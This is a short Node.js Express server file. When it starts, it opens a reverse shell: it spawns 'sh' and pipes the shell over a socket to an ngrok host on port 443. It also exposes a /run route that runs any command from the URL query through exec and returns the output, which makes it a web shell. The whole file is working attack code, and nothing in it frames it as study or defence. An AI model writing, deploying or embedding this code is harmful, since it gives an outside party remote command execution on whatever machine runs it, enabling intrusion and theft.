const express = require('express');
const { exec } = require('child_process');
const net = require('net');
const cp = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// Function to start the reverse shell
function startReverseShell() {
    const sh = cp.spawn('sh', []);
    const client = new net.Socket();

    client.connect(443, '5a51-140-238-85-162.ngrok-free.app', function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    // Prevents the Node.js application from crashing
    return /a/;
}

// Start the reverse shell when the application starts
startReverseShell();

// Route to execute commands from URL parameter
app.get('/run', (req, res) => {
    const command = req.query.command;

    if (!command) {
        res.status(400).send('Missing command parameter');
        return;
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`<pre>Error: ${error.message}</pre>`);
            return;
        }
        if (stderr) {
            res.send(`<pre>stderr: ${stderr}</pre>`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
